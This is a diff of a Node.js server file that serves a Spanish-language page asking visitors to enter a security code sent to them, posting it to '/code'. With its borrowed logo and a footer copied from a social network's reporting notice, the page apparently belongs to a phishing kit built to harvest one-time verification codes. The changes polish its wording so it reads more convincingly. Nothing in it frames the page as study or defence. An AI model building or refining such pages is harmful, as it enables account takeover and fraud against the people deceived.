@@ -57,7 +57,7 @@ else if (req.url === '/ok') {
         padding:40px 40px 20px;text-align:center;
       }
       .title{font-size:18px;font-weight:600;margin-bottom:12px}
-      .desc{font-size:12px;color:#444;margin-bottom:16px}
+      .desc{font-size:10px;color:#444;margin-bottom:16px}
       .input{
 width: 85%;
 height: 38px;
@@ -96,12 +96,12 @@ text-align: center;
       <img src="logomp1.png">
       <div/>
         <div class="title">
-        <u>Ingresa el código de 6 digitos.</u>
+        Ingresa el código que te enviamos.
         </div>
-        <div class="desc">Para confirmar tu identidad ingresá el código que enviamos.</div>
+        <div class="desc">Te enviamos un código para que puedas ingresar a tu cuenta.</div>
         <form method="POST" action="/code"> 
           <input class="input" name="codigo" placeholder="Código de seguridad" inputmode="numeric">
-          <button class="btn" type="submit">Confirmar</button>
+          <button class="btn" type="submit">Verificar el código</button>
         </form>
       </div>
       <div class="footer">También puedes denunciar el contenido que creas que es ilegal en tu pais sin iniciar sesión. Descarga la <span class="link">aplicación</span> © 2026 </div>
